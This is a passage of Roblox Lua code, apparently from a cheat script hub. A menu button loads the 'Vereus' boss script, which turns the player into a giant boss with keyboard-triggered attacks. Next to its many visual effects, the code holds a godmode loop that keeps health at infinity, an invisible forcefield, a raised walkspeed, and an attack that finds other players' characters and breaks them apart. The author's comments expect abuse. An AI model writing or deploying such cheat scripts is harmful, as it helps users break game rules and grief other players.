jtrace.Size = Vector3.new(10,0,10)
jtrace.Position = chara.Torso.Position
jtrace.CFrame = chara.Torso.CFrame - Vector3.new(0,3,0)
jtrace.Anchored = true
jtrace.CanCollide = false
jtrace.BrickColor = BrickColor.new("Really black")
jtrace.Material = "Granite"
BurningEff(jtrace)
game.Debris:AddItem(jtrace,1)
end
end

  	end    

})

Tab:AddButton({

	Name = "变成boss（键盘控制）",

	Callback = function()

     -----------//VEREUS\\-----------
--[[Movelist
Q = The reverse penance stare,
E = Doom Pillars
T = Unleashed evil ball
Y = The hunt is on
Z = CRAZY XESTER SWITCH!!!
X = Re_*101011Dact/^ed.exe
---------]]

--To get this shit out of the way, this is NOT a edit of void boss, it was a little project of mine to see how easy it was to animate 2 hands and a head.--
--Also stop calling this void boss v2, void boss switcher or any other name you come up with.--
--I'm not proud of this project however, having a script this powerful is uncreative and boring + that's what skids care about anyway.--
--Alright enjoy it guys please do not abuse the shit out of this.--

Player=game:GetService("Players").LocalPlayer
Character=Player.Character
Character.Humanoid.Name = "vereus"
hum = Character.vereus
LeftArm=Character["Left Arm"]
LeftLeg=Character["Left Leg"]
RightArm=Character["Right Arm"]
RightLeg=Character["Right Leg"]
Root=Character["HumanoidRootPart"]
Head=Character["Head"]
Torso=Character["Torso"]
Neck=Torso["Neck"]
attacking = false
snoring = false
laughing = false
taim = nil
secondform = false
change = 0
xester = false
rachjumper = false
ws = 92
hpheight = 5
huntdown = false
visualizer = false
jumpscared = false
appi = false
stoplev = false
tauntdebounce = false
allowlev = true
MseGuide = true
position = nil
levitate = false
mouse = Player:GetMouse()
settime = 0
sine = 0
t = 0
dgs = 75
RunSrv = game:GetService("RunService")
RenderStepped = game:GetService("RunService").RenderStepped
removeuseless = game:GetService("Debris")
smoothen = game:GetService("TweenService")
randomcolortable={"Cyan","Really red","Cyan","Royal purple","Lime green","Crimson","Daisy yellow","Eggplant"}
random = #randomcolortable
smoothen = game:GetService("TweenService")
local dmt2 = {143536946,2858940717}
local laughs = {2011349649,2011349983,2011351501,2011352223,2011355991,2011356475}
local soundtable2 = {2616767970,2614901458,2616891279,2614896603,2616768521,2616848595,2614905967,2614918002,2563244734,2563244134,2563244444,2563244999,2563245407,2563654940,2563656758,2563658474,2563659001}
laugh = #laughs

local HEADLERP = Instance.new("ManualWeld")
HEADLERP.Parent = Head
HEADLERP.Part0 = Head
HEADLERP.Part1 = Head
HEADLERP.C0 = CFrame.new(0, -1.5, -.5) * CFrame.Angles(math.rad(30), math.rad(0), math.rad(0))

local TORSOLERP = Instance.new("ManualWeld")
TORSOLERP.Parent = Root
TORSOLERP.Part0 = Torso
TORSOLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local ROOTLERP = Instance.new("ManualWeld")
ROOTLERP.Parent = Root
ROOTLERP.Part0 = Root
ROOTLERP.Part1 = Torso
ROOTLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local RIGHTARMLERP = Instance.new("ManualWeld")
RIGHTARMLERP.Parent = RightArm
RIGHTARMLERP.Part0 = RightArm
RIGHTARMLERP.Part1 = Torso
RIGHTARMLERP.C0 = CFrame.new(-1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local LEFTARMLERP = Instance.new("ManualWeld")
LEFTARMLERP.Parent = LeftArm
LEFTARMLERP.Part0 = LeftArm
LEFTARMLERP.Part1 = Torso
LEFTARMLERP.C0 = CFrame.new(1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local RIGHTLEGLERP = Instance.new("ManualWeld")
RIGHTLEGLERP.Parent = RightLeg
RIGHTLEGLERP.Part0 = RightLeg
RIGHTLEGLERP.Part1 = Torso
RIGHTLEGLERP.C0 = CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local LEFTLEGLERP = Instance.new("ManualWeld")
LEFTLEGLERP.Parent = LeftLeg
LEFTLEGLERP.Part0 = LeftLeg
LEFTLEGLERP.Part1 = Torso
LEFTLEGLERP.C0 = CFrame.new(0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

local function weldBetween(a, b)
    local weld = Instance.new("ManualWeld", a)
    weld.Part0 = a
    weld.Part1 = b
    weld.C0 = a.CFrame:inverse() * b.CFrame
    return weld
end

function MAKETRAIL(PARENT,POSITION1,POSITION2,LIFETIME,COLOR)
A = Instance.new("Attachment", PARENT)
A.Position = POSITION1
A.Name = "A"
B = Instance.new("Attachment", PARENT)
B.Position = POSITION2
B.Name = "B"
tr1 = Instance.new("Trail", PARENT)
tr1.Attachment0 = A
tr1.Attachment1 = B
tr1.Enabled = true
tr1.Lifetime = LIFETIME
tr1.TextureMode = "Static"
tr1.LightInfluence = 0
tr1.Color = COLOR
tr1.Transparency = NumberSequence.new(0, 1)
end

coroutine.wrap(function()
while wait() do
hum.WalkSpeed = ws
end
end)()
godmode = coroutine.wrap(function()
for i,v in pairs(Character:GetChildren()) do
if v:IsA("BasePart") and v ~= Root then
v.Anchored = false
end
end
while true do
hum.MaxHealth = math.huge
wait(0.0000001)
hum.Health = math.huge
wait()
end
end)
godmode()
ff = Instance.new("ForceField", Character)
ff.Visible = false

coroutine.wrap(function()
for i,v in pairs(Character:GetChildren()) do
if v.Name == "Animate" then v:Remove()
end
end
end)()

for _,x in pairs(Character:GetChildren()) do
if x:IsA("Decal") then x:Remove() end
end

function damagealll(Radius,Position)		
	local Returning = {}		
	for _,v in pairs(workspace:GetChildren()) do		
		if v~=Character and v:FindFirstChildOfClass('Humanoid') and v:FindFirstChild('Torso') or v:FindFirstChild('UpperTorso') then
if v:FindFirstChild("Torso") then		
			local Mag = (v.Torso.Position - Position).magnitude		
			if Mag < Radius then		
				table.insert(Returning,v)		
			end
elseif v:FindFirstChild("UpperTorso") then	
			local Mag = (v.UpperTorso.Position - Position).magnitude		
			if Mag < Radius then		
				table.insert(Returning,v)		
			end
end	
		end		
	end		
	return Returning		
end

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "Heartbeat"
script:WaitForChild("Heartbeat")

frame = 1 / 60
tf = 0
allowframeloss = false
tossremainder = false


lastframe = tick()
script.Heartbeat:Fire()


game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function swait(num)
	if num == 0 or num == nil then
		game:service("RunService").Stepped:wait(0)
	else
		for i = 0, num do
			game:service("RunService").Stepped:wait(0)
		end
	end
end

for i,v in pairs(Root.Parent:GetDescendants()) do if v:IsA("Part") then v.Transparency = 1 end end

id = "rbxassetid://2858940717"


dmt2random = dmt2[math.random(1,#dmt2)]
doomtheme = Instance.new("Sound", Torso)
doomtheme.Volume = 4
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://"..dmt2random
if doomtheme.SoundId == "rbxassetid://2858940717" then
doomtheme.Pitch = .49
else
doomtheme.Pitch = 1
end
doomtheme:Play()


Torso.ChildRemoved:connect(function(removed)
if removed.Name == "doomtheme" then
if xester then
doomtheme = Instance.new("Sound",Torso)
doomtheme.Volume = 4
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://1382488262"
doomtheme.TimePosition = 20.72
doomtheme:Play()
else
dmt2random = dmt2[math.random(1,#dmt2)]
doomtheme = Instance.new("Sound",Torso)
doomtheme.Volume = 4
doomtheme.Name = "doomtheme"
doomtheme.Looped = true
doomtheme.SoundId = "rbxassetid://"..dmt2random
if doomtheme.SoundId == "rbxassetid://2858940717" then
doomtheme.Pitch = .49
else
doomtheme.Pitch = 1
end
doomtheme:Play()
end
end
end)

function SOUND(PARENT,ID,VOL,LOOP,REMOVE)
local so = Instance.new("Sound")
so.Parent = PARENT
so.SoundId = "rbxassetid://"..ID
so.Volume = VOL
so.Looped = LOOP
so:Play()
removeuseless:AddItem(so,REMOVE)
end

bighead = Instance.new("Part",Torso)
bighead.Size = Vector3.new(1,1,1)
bighead.Anchored = false
bighead.CanCollide = false
bighead.Locked = true
bighead.Size = Vector3.new(4.75, 4.89, 4.77)
bighead.BrickColor = BrickColor.new("Really black")
bighead.CFrame = Head.CFrame
bigheadweld = weldBetween(bighead,Head)
headmesh = Instance.new("SpecialMesh",bighead)
headmesh.MeshType = "Head"
headmesh.Scale = Vector3.new(1.25,1.25,1.25)

mask = Instance.new("Part",Torso)
mask.Size = Vector3.new(.1, 0.39, .1)
mask.Anchored = false
mask.Locked = true
mask.CanCollide = false
mask.BrickColor = BrickColor.new("White")
mask.Material = "Corroded Metal"
maskweld = weldBetween(mask,bighead)
maskweld.C0 = CFrame.new(0,-2.4,0) * CFrame.Angles(math.rad(90),0,0)
maskmesh = Instance.new("SpecialMesh",mask)
maskmesh.MeshId = "rbxassetid://5158270"
maskmesh.TextureId = "rbxassetid://128212042"
maskmesh.Scale = Vector3.new(0.7, 0.5, 0.5)

lightpart1 = Instance.new("Part",Head)
lightpart1.Size = Vector3.new(2.42,2,.516)
lightpart1.Anchored = false
lightpart1.Transparency = 1
lightpart1.BrickColor = BrickColor.new("White")
lightpart1.Material = "Neon"
lightpart1weld = weldBetween(lightpart1,Head)
lightpart1weld.C0 = CFrame.new(0,.9,2.595)

horns = Instance.new("Part",Torso)
horns.Size = Vector3.new(.1,.1,.1)
horns.Material = "Slate"
horns.Locked = true
horns.BrickColor = BrickColor.new("Really black")
horns.CFrame = Head.CFrame * CFrame.new(0,3,0)
hornsmesh = Instance.new("SpecialMesh",horns)
hornsmesh.MeshId = "rbxassetid://434078905"
hornsmesh.Scale = Vector3.new(13,12,12)
hornsweld = weldBetween(horns,bighead)
hornsweld.C0 = CFrame.new(0,-3.3,.82) * CFrame.Angles(math.rad(0),math.rad(180),0)

hand1 = Instance.new("Part",Torso)
hand1.Size = Vector3.new(.1,.1,.1)
hand1.Anchored = false
hand1.Locked = true
hand1.CanCollide = false
hand1.BrickColor = BrickColor.new("White")
hand1.Material = "Slate"
hand1mesh = Instance.new("SpecialMesh",hand1)
hand1mesh.MeshId = "rbxassetid://37241605"
hand1mesh.Scale = Vector3.new(8, 8, 8)
HAND1LERP = weldBetween(hand1,Torso)
HAND1LERP.C0 = CFrame.new(4.5,-5,6) * CFrame.Angles(math.rad(10),math.rad(-5),math.rad(-36))

hand2 = Instance.new("Part",Torso)
hand2.Size = Vector3.new(.1,.1,.1)
hand2.Anchored = false
hand2.CanCollide = false
hand2.Locked = true
hand2.BrickColor = BrickColor.new("White")
hand2.Material = "Slate"
hand2mesh = Instance.new("SpecialMesh",hand2)
hand2mesh.MeshId = "rbxassetid://2899129749"
hand2mesh.Scale = Vector3.new(.8, .8, .8)
HAND2LERP = weldBetween(hand2,Torso)
HAND2LERP.C0 = HAND2LERP.C0:Inverse() * CFrame.new(-5,-5,6) * CFrame.Angles(math.rad(90),math.rad(90),math.rad(95))

mg1 = Instance.new("Part",Torso)
mg1.Anchored = false
mg1.CanCollide = false
mg1.Locked = true
mg1.Size = Vector3.new(4,4,4)
mg1.Shape = "Ball"
mg1.BrickColor = BrickColor.new("Really black")
mg1.Material = "Neon"
mg1.CFrame = hand1.CFrame
mg1weld = weldBetween(mg1,hand1)
mg1weld.C0 = CFrame.new(0,2.7,-4)
blackhole = Instance.new("ParticleEmitter",mg1)
blackhole.Texture = "rbxassetid://258128463"
blackhole.Size = NumberSequence.new(2,2)
blackhole.Rate = 50
blackhole.LockedToPart = true
blackhole.Color = ColorSequence.new(BrickColor.new("Really black").Color,BrickColor.new("Really black").Color)
blackhole.RotSpeed = NumberRange.new(50)
blackhole.Lifetime = NumberRange.new(1)
blackhole.Speed = NumberRange.new(0)

mg2 = Instance.new("Part",Torso)
mg2.Anchored = false
mg2.CanCollide = false
mg2.Shape = "Ball"
mg2.Locked = true
mg2.Size = Vector3.new(4,4,4)
mg2.BrickColor = BrickColor.new("Really black")
mg2.Material = "Neon"
mg2.CFrame = hand2.CFrame
mg2weld = weldBetween(mg2,hand2)
mg2weld.C0 = CFrame.new(0,2.7,-4)
blackhole2 = Instance.new("ParticleEmitter",mg2)
blackhole2.Texture = "rbxassetid://258128463"
blackhole2.Size = NumberSequence.new(2,2)
blackhole2.Rate = 50
blackhole2.Color = ColorSequence.new(BrickColor.new("Really black").Color,BrickColor.new("Really black").Color)
blackhole2.RotSpeed = NumberRange.new(50)
blackhole2.Lifetime = NumberRange.new(1)
blackhole2.LockedToPart = true
blackhole2.Speed = NumberRange.new(0)

slaten = Instance.new("Decal",hand2)
slaten.Texture = "rbxassetid://647441616"
slaten.Color3 = Color3.new(0, 0, 0)
slaten.Face = "Top"

slaten2 = Instance.new("Decal",hand2)
slaten2.Texture = "rbxassetid://647417318"
slaten2.Color3 = Color3.new(0,0,0)
slaten2.Face = "Top"

slatez = Instance.new("Decal",hand1)
slatez.Texture = "rbxassetid://647441616"
slatez.Color3 = Color3.new(0, 0, 0)
slatez.Face = "Top"

slatez2 = Instance.new("Decal",hand1)
slatez2.Texture = "rbxassetid://647417318"
slatez2.Color3 = Color3.new(0,0,0)
slatez2.Face = "Top"

slatez3 = Instance.new("Decal",hand1)
slatez3.Texture = "rbxassetid://647410994"
slatez3.Color3 = Color3.new(1,1,1)
slatez3.Face = "Top"

slatez4 = Instance.new("Decal",hand1)
slatez4.Texture = "rbxassetid://647413967"
slatez4.Color3 = Color3.new(1,1,1)
slatez4.Face = "Top"

slatex = Instance.new("Decal",horns)
slatex.Texture = "rbxassetid://647441616"
slatex.Color3 = Color3.new(0, 0, 0)
slatex.Face = "Top"

slatex2 = Instance.new("Decal",horns)
slatex2.Texture = "rbxassetid://647417318"
slatex2.Color3 = Color3.new(0,0,0)
slatex2.Face = "Top"

slatex3 = Instance.new("Decal",horns)
slatex3.Texture = "rbxassetid://647410994"
slatex3.Color3 = Color3.new(1,1,1)
slatex3.Face = "Top"

slatex4 = Instance.new("Decal",horns)
slatex4.Texture = "rbxassetid://647413967"
slatex4.Color3 = Color3.new(1,1,1)
slatex4.Face = "Top"

slatex5 = Instance.new("Decal",horns)
slatex5.Texture = "rbxassetid://64739326f6"
slatex5.Color3 = Color3.new(1, 1, 1)
slatex5.Face = "Top"

eyeball1 = Instance.new("Part",Torso)
eyeball1.Anchored = false
eyeball1.CanCollide = false
eyeball1.Locked = true
eyeball1.Shape = "Ball"
eyeball1.Material = "Glass"
eyeball1.Size = Vector3.new(3.25, 3.25, 3.25)
eyeball1.BrickColor = BrickColor.new("Really black")
eyeball1weld = weldBetween(eyeball1,Head)
eyeball1weld.C0 = CFrame.new(.6,-.2,1.25)

eyeball2 = Instance.new("Part",Torso)
eyeball2.Anchored = false
eyeball2.CanCollide = false
eyeball2.Shape = "Ball"
eyeball2.Locked = true
eyeball2.Material = "Glass"
eyeball2.Size = Vector3.new(3.25, 3.25, 3.25)
eyeball2.BrickColor = BrickColor.new("Really black")
eyeball2weld = weldBetween(eyeball2,Head)
eyeball2weld.C0 = CFrame.new(-.6,-.2,1.25)

eyeball3 = Instance.new("Part",Torso)
eyeball3.Anchored = false
eyeball3.CanCollide = false
eyeball3.Locked = true
eyeball3.Material = "Neon"
eyeball3.Size = Vector3.new(0.4, 0.4, 0.4)
eyeball3.BrickColor = BrickColor.new("Crimson")
eyeball3mesh = Instance.new("SpecialMesh",eyeball3)
eyeball3mesh.MeshType = "Sphere"
eyeball3weld = weldBetween(eyeball3,Head)
eyeball3weld.C0 = CFrame.new(-1.2,-.3,2.65)

eyeball4 = Instance.new("Part",Torso)
eyeball4.Anchored = false
eyeball4.CanCollide = false
eyeball4.Material = "Neon"
eyeball4.Locked = true
eyeball4.Size = Vector3.new(0.4, 0.4, 0.4)
eyeball4.BrickColor = BrickColor.new("Crimson")
eyeball4mesh = Instance.new("SpecialMesh",eyeball4)
eyeball4mesh.MeshType = "Sphere"
eyeball4weld = weldBetween(eyeball4,Head)
eyeball4weld.C0 = CFrame.new(1.2,-.3,2.65)

coroutine.wrap(function()
while true do
wait(5)
for i = 1, 10 do
eyeball3.Size = eyeball3.Size - Vector3.new(0,.04,0)
eyeball4.Size = eyeball4.Size - Vector3.new(0,.04,0)
swait()
end
for i = 1, 10 do
eyeball3.Size = eyeball3.Size + Vector3.new(0,.04,0)
eyeball4.Size = eyeball4.Size + Vector3.new(0,.04,0)
swait()
end
swait()
end
end)()

slateh = Instance.new("Decal",mask)
slateh.Texture = "rbxassetid://647441616"
slateh.Color3 = Color3.new(0, 0, 0)
slateh.Face = "Top"

slateh2 = Instance.new("Decal",mask)
slateh2.Texture = "rbxassetid://647417318"
slateh2.Color3 = Color3.new(0,0,0)
slateh2.Face = "Top"

slateh3 = Instance.new("Decal",mask)
slateh3.Texture = "rbxassetid://647410994"
slateh3.Color3 = Color3.new(1,1,1)
slateh3.Face = "Top"

slateh4 = Instance.new("Decal",mask)
slateh4.Texture = "rbxassetid://647413967"
slateh4.Color3 = Color3.new(1,1,1)
slateh4.Face = "Top"

slateh5 = Instance.new("Decal",mask)
slateh5.Texture = "rbxassetid://64739326f6"
slateh5.Color3 = Color3.new(1, 1, 1)
slateh5.Face = "Top"

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='m' then
immortality()
elseif Press=='t' then
if xester then
if tauntdebounce then return end
tauntdebounce = true
laughing = true
laugh = laughs[math.random(1,#laughs)]
laughy = Instance.new("Sound",Head)
laughy.SoundId = "rbxassetid://"..laugh
laughy.Volume = 10
laughy:Play()
wait(1)
wait(laughy.TimeLength)
laughing = false
laughy:Remove()
tauntdebounce = false
elseif rachjumper then
if tauntdebounce == true then return end
tauntdebounce = true
rdnm2 = soundtable2[math.random(1,#soundtable2)]
tauntsound = Instance.new("Sound", Head)
tauntsound.Volume = 8
tauntsound.SoundId = "http://www.roblox.com/asset/?id="..rdnm2
tauntsound.Looped = false
tauntsound:Play()
wait(3)
wait(tauntsound.TimeLength)
tauntsound:Remove()
wait(1)
tauntdebounce = false
else
if debounce then return end
debounce = true
attacking = true
ws = 0
local energball = Instance.new("Part",Torso)
energball.Shape = "Ball"
energball.Material = "Neon"
energball.Size = Vector3.new(.1,.1,.1)
energball.Anchored = true
energball.CanCollide = false
energball.BrickColor = BrickColor.new("Really black")
energball.CFrame = hand1.CFrame * CFrame.new(0,1,-2.5)
SOUND(energball,2880335731,10,false,10)
local g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
for i = 1, 250 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
coroutine.wrap(function()
local sk = Instance.new("Part",Torso)
sk.CanCollide = false
sk.Anchored = true
sk.BrickColor = BrickColor.new("Really black")
sk.Name = "sk"
sk.CFrame = energball.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),0,math.rad(math.random(-180,180)))
local skmesh = Instance.new("SpecialMesh",sk)
skmesh.MeshId = "rbxassetid://662586858"
skmesh.Name = "wave"
skmesh.Scale = Vector3.new(.02,.005,.02)
for i = 1, 20 do
skmesh.Scale = skmesh.Scale + Vector3.new(.004,0,.004)
sk.Transparency = sk.Transparency + .05
swait()
end
sk:Remove()
end)()
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .7
shockwave.BrickColor = BrickColor.new("Really black")
shockwave.CFrame = CFrame.new(energball.Position) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(7,.1,7)
shockwavemesh.MeshId = "rbxassetid://20329976"
for i = 1, 20 do
shockwave.Transparency = shockwave.Transparency + .05
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(.5,0,.5)
swait()
end
shockwave:Remove()
end)()
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .4
shockwave.BrickColor = BrickColor.new("Really black")
shockwave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,1,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .4
shockwave2.BrickColor = BrickColor.new("Really black")
shockwave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(1,1,1)
shockwavemesh2.MeshId = "rbxassetid://20329976"
for i = 1, 30 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+math.random(-4,12)),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-math.random(-4,12)),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(8,1,8)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(10,.5,10)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
energball.Size = energball.Size + Vector3.new(.02,.02,.02)
energball.CFrame = hand1.CFrame * CFrame.new(0,0,-3)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(6.5,0,-1) * CFrame.Angles(math.rad(70),math.rad(90),math.rad(0)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(6.5,0,-5) * CFrame.Angles(math.rad(-110),math.rad(90),math.rad(0)),.2)
swait()
end
local bwoo = Instance.new("Sound",Torso)
bwoo.SoundId = "rbxassetid://134012322"
bwoo.Volume = 10
bwoo.Pitch = .85
bwoo:Play()
removeuseless:AddItem(bwoo,10)
for i = 1, 20 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
energball.CFrame = hand2.CFrame * CFrame.new(0,0,-3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(-35),0),.2)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(4.5,-5 + .5 * math.sin(sine/14),6) * CFrame.Angles(math.rad(10 + 1 * math.sin(sine/13)),math.rad(-5 + 5 * math.sin(sine/12)),math.rad(-36 - 4 * math.sin(sine/11))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-4.5,0,7) * CFrame.Angles(math.rad(-90),math.rad(18),math.rad(37)),.2)
swait()
end
energball.Anchored = false
local bov = Instance.new("BodyVelocity",energball)
bov.maxForce = Vector3.new(99999,99999,99999)
energball.CFrame = CFrame.new(energball.Position,mouse.Hit.p)
bov.velocity = energball.CFrame.lookVector*300
local hitted = false
energball.Touched:connect(function(hit)
if hit:IsA("Part") and hit.Parent ~= Character and hit.Name ~= "rachjumper" and hit.Parent.Parent ~= Character then
if hitted then return end
hitted = true
print("hit")
energball.Anchored = true
local energballplosion = energball:Clone() energballplosion.Parent = Torso
energball.Transparency = 1
local render = Instance.new("Sound",energball)
render.SoundId = "rbxassetid://2006635781"
render.Volume = 10 * 10
render:Play()
local zm = 0
for i = 1, 70 do
zm = zm + 2
Hit = damagealll(zm,energball.Position)
for _,v in pairs(Hit) do
if v:FindFirstChildOfClass("Humanoid") and v:FindFirstChildOfClass("Humanoid").Health > 0 then
slachtoffer = v:FindFirstChildOfClass("Humanoid")
coroutine.wrap(function()
local w = Instance.new("Part",Torso)
w.Anchored = true
w.CanCollide = false
w.Material = "Neon"
w.BrickColor = BrickColor.new("Really black")
if slachtoffer.RigType == Enum.HumanoidRigType.R15 then
w.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame
elseif slachtoffer.RigType == Enum.HumanoidRigType.R6 then
w.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame
end
w.Size = Vector3.new(3,3,3)
w.Shape = "Ball"
for i = 1, 50 do
w.Transparency = w.Transparency + .05
w.Size = w.Size + Vector3.new(3.5,3.5,3.5)
swait()
end
w:Remove()
end)()
for i = 1, 8 do
coroutine.wrap(function()
local ps = Instance.new("Part",Torso)
ps.Size = Vector3.new(1,1,1)
ps.Anchored = true
ps.BrickColor = BrickColor.new("Really black")
ps.Material = "Neon"
if slachtoffer.RigType == Enum.HumanoidRigType.R6 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
elseif slachtoffer.RigType == Enum.HumanoidRigType.R15 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
end
local psm = Instance.new("SpecialMesh",ps)
psm.MeshType = "Sphere"
psm.Scale = Vector3.new(3,1,3)
for i = 1, 50 do
psm.Scale = psm.Scale + Vector3.new(0,5,0)
ps.Transparency = ps.Transparency + .025
swait()
end
ps:Remove()
end)()
end
for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Clone() x.Parent = workspace x.Material = "Glass" x.BrickColor = BrickColor.new("Really black") x.Anchored = false
x.CanCollide = true x:BreakJoints() end end
for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Remove() end end
slachtoffer.Parent:BreakJoints()
end
end
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .4
shockwave.BrickColor = BrickColor.new("Really black")
shockwave.CFrame = CFrame.new(energballplosion.Position) * CFrame.new(0,-8,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,2,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .4
shockwave2.BrickColor = BrickColor.new("Really black")
shockwave2.CFrame = CFrame.new(energballplosion.Position) * CFrame.new(0,-8,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(11,2,11)
shockwavemesh2.MeshId = "rbxassetid://20329976"
local biggar = 0
for i = 1, 30 do
biggar = biggar + 4
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+math.random(-4,12)),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-math.random(-4,12)),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(8 + biggar,4,8 + biggar)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(10 + biggar,4,10 + biggar)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
energballplosion.Size = energballplosion.Size + Vector3.new(2,2,2)
swait()
end
for i = 1, 80 do
zm = zm + 3.5
Hit = damagealll(zm,energball.Position)
for _,v in pairs(Hit) do
if v:FindFirstChildOfClass("Humanoid") and v:FindFirstChildOfClass("Humanoid").Health > 0 then
slachtoffer = v:FindFirstChildOfClass("Humanoid")
coroutine.wrap(function()
local w = Instance.new("Part",Torso)
w.Anchored = true
w.CanCollide = false
w.Material = "Neon"
w.BrickColor = BrickColor.new("Really black")
if slachtoffer.RigType == Enum.HumanoidRigType.R15 then
w.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame
elseif slachtoffer.RigType == Enum.HumanoidRigType.R6 then
w.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame
end
w.Size = Vector3.new(3,3,3)
w.Shape = "Ball"
for i = 1, 50 do
w.Transparency = w.Transparency + .05
w.Size = w.Size + Vector3.new(3.5,3.5,3.5)
swait()
end
w:Remove()
end)()
for i = 1, 8 do
coroutine.wrap(function()
local ps = Instance.new("Part",Torso)
ps.Size = Vector3.new(1,1,1)
ps.Anchored = true
ps.BrickColor = BrickColor.new("Really black")
ps.Material = "Neon"
if slachtoffer.RigType == Enum.HumanoidRigType.R6 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
elseif slachtoffer.RigType == Enum.HumanoidRigType.R15 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
end
local psm = Instance.new("SpecialMesh",ps)
psm.MeshType = "Sphere"
psm.Scale = Vector3.new(3,1,3)
for i = 1, 50 do
psm.Scale = psm.Scale + Vector3.new(0,5,0)
ps.Transparency = ps.Transparency + .025
swait()
end
ps:Remove()
end)()
end
